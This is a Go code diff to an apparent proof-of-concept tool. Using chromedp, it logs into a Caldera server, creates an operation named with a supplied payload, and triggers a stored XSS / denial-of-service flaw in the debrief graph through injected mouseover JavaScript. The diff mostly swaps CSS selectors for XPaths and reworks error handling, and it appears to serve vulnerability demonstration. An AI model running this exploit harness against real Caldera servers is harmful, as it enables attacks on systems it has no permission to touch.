@@ -56,16 +56,14 @@ var (
 			caldera.RepoPath = viper.GetString("repo_path")
 			caldera.Creds, err = GetRedCreds(caldera.RepoPath)
 			if err != nil {
-				log.WithError(err).Errorf(
+				log.WithError(err).Fatalf(
 					"failed to get Caldera credentials: %v", err)
-				os.Exit(1)
 			}
 
 			caldera.Driver.Headless = viper.GetBool("headless")
 			driver, cancels, err := setupChrome(caldera)
 			if err != nil {
-				log.WithError(err).Error("failed to setup Chrome")
-				os.Exit(1)
+				log.WithError(err).Fatal("failed to setup Chrome")
 			}
 
 			defer cancelAll(cancels)
@@ -74,8 +72,7 @@ var (
 
 			caldera, err = Login(caldera)
 			if err != nil {
-				log.WithError(err).Error("failed to login to caldera")
-				os.Exit(1)
+				log.WithError(err).Fatal("failed to login to caldera")
 			}
 
 			caldera.Payload = viper.GetString("payload")
@@ -166,14 +163,15 @@ func storedXSSDosVuln(payload string) error {
 		return err
 	}
 
-	// Selectors for chromeDP
-	pageSelector := "#nav-menu > ul:nth-child(2) > li:nth-child(4) > a"
-	createOPSelector := "#select-operation > div:nth-child(3) > button"
+	// XPath and selectors for chromeDP
+	opLinkXPath := "/html/body/main/div[1]/aside/ul[1]/li[4]/a"
+	createOPXPath := "/html/body/main/div[2]/div[2]/div[1]/div/div/form/div/div[2]/button"
 	opNameSelector := "#op-name"
-	startSelector := "#operationsPage > div > div.modal.is-active > div.modal-card > footer > nav > div.level-right > div > button"
-	debriefSelector := "#nav-menu > ul:nth-child(4) > li:nth-child(4) > a"
-	operationSelector := "#tab-debrief > div > div:nth-child(3) > div.columns.mb-6 > div.column.is-3 > form > div > div > div > select > option"
-	dropdownSelector := "#debrief-graph > div.is-flex.graph-controls.m-2 > div > select"
+	startButtonXPath := "/html/body/main/div[2]/div[2]/div[1]/div/div/div[3]/div[2]/footer/nav/div[2]/div/button"
+	debriefLinkXPath := "/html/body/main/div[1]/aside/ul[2]/li[4]/a"
+	firstOperationXPath := "/html/body/main/div[2]/div[2]/div[2]/div/div[2]/div[2]/div[1]/form/div/div/div/select/option[1]"
+	opGraphDropdownSelectXPath := "/html/body/main/div[2]/div[2]/div[2]/div/div[2]/div[2]/div[2]/div[3]/div[2]/div/select"
+	tacticSelector := "#debrief-graph > div.is-flex.graph-controls.m-2 > div > select"
 	triggerVulnJS := "nodes = document.querySelectorAll('[id^=node]'); nodes.forEach((x, i) => x.dispatchEvent(new MouseEvent('mouseover', {'bubbles': true})));"
 
 	imagePath := viper.GetString("image_path")
@@ -197,27 +195,38 @@ func storedXSSDosVuln(payload string) error {
 				}
 
 				if err != nil {
-					panic(err)
+					log.Fatal(err)
 				}
 			}()
 		}
 	})
 	if err := chromedp.Run(caldera.Driver.Context,
 		network.Enable(),
-		chromedp.Click(pageSelector),
-		chromedp.Sleep(Wait(1000)),
-		chromedp.Click(createOPSelector),
+		// Click the operations link
+		chromedp.Click(opLinkXPath),
+		chromedp.Sleep(Wait(2000)),
+		// Click Create Operation button
+		chromedp.Click(createOPXPath),
+		// Create operation with the provided payload
 		chromedp.SendKeys(opNameSelector, payload),
-		chromedp.Click(startSelector),
-		chromedp.Sleep(Wait(1000)),
-		chromedp.Click(debriefSelector),
-		chromedp.Sleep(Wait(1000)),
-		chromedp.Click(operationSelector),
-		chromedp.Sleep(Wait(1000)),
-		chromedp.SendKeys(dropdownSelector, "Tactic"),
-		chromedp.Sleep(Wait(1000)),
+		// Click the Start button
+		chromedp.Click(startButtonXPath),
+		chromedp.Sleep(Wait(2000)),
+		// Click the debrief link
+		chromedp.Click(debriefLinkXPath),
+		chromedp.Sleep(Wait(2000)),
+		// Click the operation with the payload that we introduced previously
+		chromedp.Click(firstOperationXPath),
+		chromedp.Sleep(Wait(2000)),
+		// Click the debrief graph dropdown menu
+		chromedp.Click(opGraphDropdownSelectXPath),
+		chromedp.Sleep(Wait(2000)),
+		// Select Tactic from the operation graph dropdown menu
+		chromedp.SendKeys(tacticSelector, "Tactic"),
+		chromedp.Sleep(Wait(2000)),
+		// Trigger the vulnerability
 		chromedp.Evaluate(triggerVulnJS, &res),
-		chromedp.Sleep(Wait(1000)),
+		chromedp.Sleep(Wait(2000)),
 		chromedp.ActionFunc(func(ctx context.Context) error {
 
 			_, _, contentSize, _, _, _, err := page.GetLayoutMetrics().Do(ctx)
